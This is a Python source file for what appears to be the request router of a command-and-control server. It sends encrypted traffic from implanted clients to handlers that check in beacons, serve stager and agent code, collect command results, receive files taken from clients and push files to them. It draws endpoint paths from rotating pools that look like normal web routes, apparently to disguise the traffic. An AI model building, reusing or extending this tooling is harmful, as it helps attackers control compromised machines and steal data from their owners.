import logging
import json
import base64
import urllib.parse
import re

logger = logging.getLogger(__name__)

class OperationRouter:
    """
    Routes requests to appropriate handlers based on operation type in payload
    rather than URL path
    """
    
    def __init__(self, request_handler, client_manager, crypto_helper, client_helper, path_router):
        self.request_handler = request_handler
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.client_helper = client_helper
        self.path_router = path_router
        
        # Load handler classes
        from handlers.beacon_handler import BeaconHandler
        from handlers.agent_handler import AgentHandler
        from handlers.file_handler import FileHandler
        from handlers.result_handler import ResultHandler
        from handlers.file_download_handler import FileDownloadHandler
        
        # Initialize handlers
        self.beacon_handler = BeaconHandler(
            request_handler, 
            client_manager, 
            crypto_helper, 
            client_helper, 
            path_router
        )
        
        self.agent_handler = AgentHandler(
            request_handler, 
            client_manager, 
            crypto_helper, 
            client_helper, 
            path_router
        )
        
        self.file_handler = FileHandler(
            request_handler, 
            client_manager, 
            crypto_helper, 
            client_helper, 
            path_router
        )
        
        self.result_handler = ResultHandler(
            request_handler, 
            client_manager, 
            crypto_helper, 
            client_helper, 
            path_router
        )
        
        self.file_download_handler = FileDownloadHandler(
            request_handler, 
            client_manager, 
            crypto_helper, 
            client_helper, 
            path_router
        )
    
    def handle_operation(self, method="POST"):
        """
        Handle an operation by determining type from payload content or path
        
        Args:
            method: HTTP method (GET or POST)
        """
        try:
            # First check if the path matches any endpoint types
            path = self.request_handler.path
            base_path = path.split('?')[0] if '?' in path else path
            endpoint_type = self.path_router.get_endpoint_type(base_path)
            
            # Parse query parameters for both GET and POST
            query_params = self._parse_query_params(path)
            
            # Enhanced logging for request handling
            logger.info(f"Received {method} request on path: {path}")
            logger.info(f"Endpoint type identified as: {endpoint_type}")
            
            # Check for stager indicator in query parameters (new)
            if 'type' in query_params and query_params['type'] == 'stager':
                logger.info(f"Identified stager request from query parameter")
                self.agent_handler.handle_stager_request()
                return
            
            # Handle agent downloads based on operation type in payload
            # All paths are now from the pool, so we need to check for special content
            if self._looks_like_agent_request(path, method, query_params):
                logger.info(f"Routing to agent_handler for agent code based on path pattern")
                self.agent_handler.handle_agent_request()
                return
            elif self._looks_like_stager_request(path, method, query_params):
                logger.info(f"Routing to agent_handler for stager code based on path pattern")
                self.agent_handler.handle_stager_request()
                return
            
            # Special check for paths that look like file operations
            if self._looks_like_file_operation(path):
                logger.info(f"Path {path} appears to be a file operation path based on pattern")
                # Check request contents to determine if it's a download or upload
                if self._is_file_download_request(method):
                    logger.info(f"Request appears to be a file download (server TO client)")
                    self.file_download_handler.handle()
                    return
            
            # For other endpoints, try to extract payload data
            if method == "GET":
                # Parse query string for data (already done above)
                encrypted_data = query_params.get('d')  # Shortened from 'data'
                token = query_params.get('t', '')       # Shortened from 'token'
                is_first_contact = query_params.get('i', 'false').lower() == 'true'  # Shortened from 'init'
                client_id = query_params.get('c')       # Shortened from 'client_id'
                
                if not encrypted_data:
                    # If no data parameter, try to determine based on the path pattern
                    if endpoint_type in ["pool_path", "previous_pool_path", "old_pool_path"]:
                        # This might be a ping or simple beacon
                        logger.info(f"Routing to beacon_handler (no data, endpoint type: {endpoint_type})")
                        self.beacon_handler.handle()
                        return
                    elif endpoint_type in ["file_operation_path", "previous_file_operation_path", "old_file_operation_path"]:
                        # This might be a file download request
                        logger.info(f"Routing to file_download_handler (no data, endpoint type: {endpoint_type})")
                        self.file_download_handler.handle()
                        return
                    else:
                        self.send_error_response(400, "Missing data parameter")
                        return
            else:  # POST
                # Read content data
                content_length = int(self.request_handler.headers.get('Content-Length', 0))
                if content_length == 0:
                    self.send_error_response(400, "Missing content")
                    return
                    
                request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
                
                # Parse the JSON body
                try:
                    body_data = json.loads(request_body)
                    encrypted_data = body_data.get('d')    # Shortened from 'data'
                    token = body_data.get('t', '')         # Shortened from 'token'
                    is_first_contact = body_data.get('f', False)  # Shortened from 'first_contact'
                    client_id = body_data.get('c')         # Shortened from 'client_id'
                    
                    if not encrypted_data:
                        self.send_error_response(400, "Missing data field")
                        return
                except json.JSONDecodeError:
                    # For non-JSON POST requests, check if it's a file operation
                    if self._looks_like_file_operation(path):
                        logger.info(f"Non-JSON POST request to file operation path, routing to file_download_handler")
                        self.file_download_handler.handle()
                        return
                    else:
                        self.send_error_response(400, "Invalid JSON format")
                        return
            
            # For first contact, don't attempt to decrypt
            if is_first_contact:
                # Handle as beacon for first contact (initial key exchange)
                logger.info(f"Handling as first contact beacon")
                self.beacon_handler.handle(include_rotation_info=True)
                return
            
            # Store client ID on the request handler for use by the operation handlers
            if client_id:
                self.request_handler.client_id = client_id
            
            # Identify client and decrypt data
            client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
            
            if client_id:
                # Store identified client ID on the request handler
                self.request_handler.client_id = client_id
                logger.info(f"Successfully identified client: {client_id}")
            
            if not client_id or not decrypted_data:
                # Try with provided client ID if available
                if client_id:
                    try:
                        decrypted_data = self.crypto_helper.decrypt(encrypted_data, client_id)
                        logger.info(f"Decrypted data using provided client ID: {client_id}")
                    except Exception as e:
                        logger.error(f"Failed to decrypt with provided client ID: {e}")
                        self.send_error_response(401, "Authentication failed")
                        return
                else:
                    self.send_error_response(401, "Authentication failed")
                    return
            
            # Parse decrypted data to determine operation type
            try:
                # Try to parse as JSON if it's a string
                if isinstance(decrypted_data, str):
                    try:
                        payload = json.loads(decrypted_data)
                    except json.JSONDecodeError:
                        # If it can't be parsed as JSON, determine based on path patterns
                        if self._looks_like_file_operation(path):
                            logger.info(f"Routing to file_download_handler based on path pattern")
                            self.request_handler.decrypted_payload = decrypted_data
                            self.file_download_handler.handle()
                            return
                        else:
                            # Assume it's a beacon with simple data
                            logger.info(f"Treating non-JSON decrypted data as beacon data")
                            self.request_handler.decrypted_payload = decrypted_data
                            self.beacon_handler.handle()
                            return
                else:
                    payload = decrypted_data
                
                # Enhanced logic to check for file operations based on payload content
                if isinstance(payload, dict):
                    # Check for file download indicators
                    if "FilePath" in payload or "Destination" in payload:
                        logger.info(f"Identified file download request by payload fields")
                        self.request_handler.decrypted_payload = payload
                        self.file_download_handler.handle()
                        return
                    # Check for file upload indicators
                    elif "FileName" in payload and "FileContent" in payload:
                        logger.info(f"Identified file upload request by payload fields")
                        self.request_handler.decrypted_payload = payload
                        self.file_handler.handle()
                        return
                
                # Extract operation type
                operation_type = payload.get("op_type", "beacon")  # Default to beacon
                operation_data = payload.get("payload", {})
                
                logger.info(f"Operation router: Identified operation type: {operation_type}")
                
                # Store the decrypted payload for use by handlers
                self.request_handler.decrypted_payload = operation_data
                
                # Route to appropriate handler based on operation type
                if operation_type == "beacon":
                    logger.info(f"Routing to beacon_handler based on op_type")
                    self.beacon_handler.handle()
                elif operation_type == "result":
                    logger.info(f"Routing to result_handler based on op_type")
                    self.result_handler.handle()
                elif operation_type == "file_up":
                    # Handle file upload FROM client TO server (saving to downloads folder)
                    logger.info(f"Routing to file_handler based on op_type (file_up)")
                    self.file_handler.handle()
                elif operation_type == "file_down":
                    # Handle file download FOR client FROM server (reading from uploads folder)
                    logger.info(f"Routing to file_download_handler based on op_type (file_down)")
                    self.file_download_handler.handle()
                elif operation_type == "agent":
                    logger.info(f"Routing to agent_handler based on op_type")
                    self.agent_handler.handle_agent_request()
                elif operation_type == "stager":
                    logger.info(f"Routing to agent_handler (stager) based on op_type")
                    self.agent_handler.handle_stager_request()
                else:
                    # Default based on path pattern
                    logger.info(f"No matching op_type, using endpoint type: {endpoint_type}")
                    if endpoint_type in ["pool_path", "previous_pool_path", "old_pool_path"]:
                        self.beacon_handler.handle()
                    elif self._looks_like_file_operation(path):
                        # Determine if it's a download or upload based on context
                        if "upload" in path.lower() or "file_up" in operation_type.lower():
                            logger.info(f"Routing by path: file upload FROM client TO server")
                            self.file_handler.handle()
                        else:
                            logger.info(f"Routing by path: file download FROM server TO client")
                            self.file_download_handler.handle()
                    else:
                        # Unknown operation type, log and send generic response
                        logger.warning(f"Unknown operation type: {operation_type}")
                        self.send_success_response()
            except json.JSONDecodeError as e:
                # Handle direct request to endpoint without JSON payload
                logger.info(f"JSON decode error, routing based on endpoint pattern")
                if self._looks_like_file_operation(path):
                    self.file_download_handler.handle()
                else:
                    self.beacon_handler.handle()
            except Exception as e:
                logger.error(f"Error handling operation: {e}")
                self.send_error_response(500, "Server error")
        except Exception as e:
            logger.error(f"Error in operation router: {e}")
            self.send_error_response(500, "Server error")
    
    def _parse_query_params(self, path):
        """Parse query parameters from a URL path"""
        query_params = {}
        if '?' in path:
            query_string = path.split('?', 1)[1]
            for param in query_string.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    query_params[key] = urllib.parse.unquote(value)
        return query_params
    
    def _looks_like_agent_request(self, path, method, query_params=None):
        """Check if the request appears to be for agent code"""
        # Check query parameters first
        if query_params and 'type' in query_params and query_params['type'] == 'agent':
            return True
            
        # Check path patterns as fallback
        path_lower = path.lower()
        return (
            ("/agent" in path_lower or 
             "/raw_agent" in path_lower or 
             "/js/" in path_lower or
             "/api/resources" in path_lower) and
            method == "GET"
        )
    
    def _looks_like_stager_request(self, path, method, query_params=None):
        """Check if the request appears to be for stager code"""
        # Check query parameters first
        if query_params and 'type' in query_params and query_params['type'] == 'stager':
            return True
            
        # Check path patterns as fallback
        path_lower = path.lower()
        return (
            ("/stager" in path_lower or 
             "/loader" in path_lower or 
             "/bootstrap" in path_lower or
             "/init" in path_lower) and
            method == "GET"
        )
    
    def _looks_like_file_operation(self, path):
        """Check if the path appears to be for file operations"""
        path_lower = path.lower()
        return (
            "/file" in path_lower or 
            "/download" in path_lower or 
            "/upload" in path_lower or 
            "/content" in path_lower or
            "/static/" in path_lower
        )
    
    def _is_file_download_request(self, method):
        """
        Analyze the request to determine if it's likely a file download request
        
        Args:
            method: HTTP method (GET or POST)
            
        Returns:
            bool: True if it appears to be a file download request
        """
        # Check Content-Type header
        content_type = self.request_handler.headers.get('Content-Type', '')
        
        # If this is a POST with content-type indicating a file operation
        if method == "POST" and (
            "json" in content_type or 
            "application/octet-stream" in content_type
        ):
            try:
                # Check if the body has file request indicators
                content_length = int(self.request_handler.headers.get('Content-Length', 0))
                if content_length > 0:
                    body = self.request_handler.rfile.read(content_length).decode('utf-8')
                    # Reset the read position - important for subsequent handlers
                    self.request_handler.rfile = type(self.request_handler.rfile)(
                        body.encode('utf-8')
                    )
                    
                    # Look for file request keywords
                    if ("file" in body.lower() and "path" in body.lower()) or "filerequest" in body.lower():
                        return True
            except:
                # If we can't read or parse the body, use path-based heuristics
                path = self.request_handler.path.lower()
                return "/file/" in path or "/download/" in path
        
        # Otherwise, check the path
        path = self.request_handler.path.lower()
        return "/file/" in path or "/download/" in path or "/content/" in path
    
    def send_error_response(self, status_code=500, message="Server Error"):
        """Send an error response"""
        self.request_handler.send_response(status_code)
        self.request_handler.send_header("Content-type", "text/plain")
        self.request_handler.end_headers()
        self.request_handler.wfile.write(message.encode("utf-8"))
    
    def send_success_response(self):
        """Send a simple success response"""
        self.request_handler.send_response(200)
        self.request_handler.send_header("Content-type", "text/plain")
        self.request_handler.end_headers()
        self.request_handler.wfile.write(b"OK")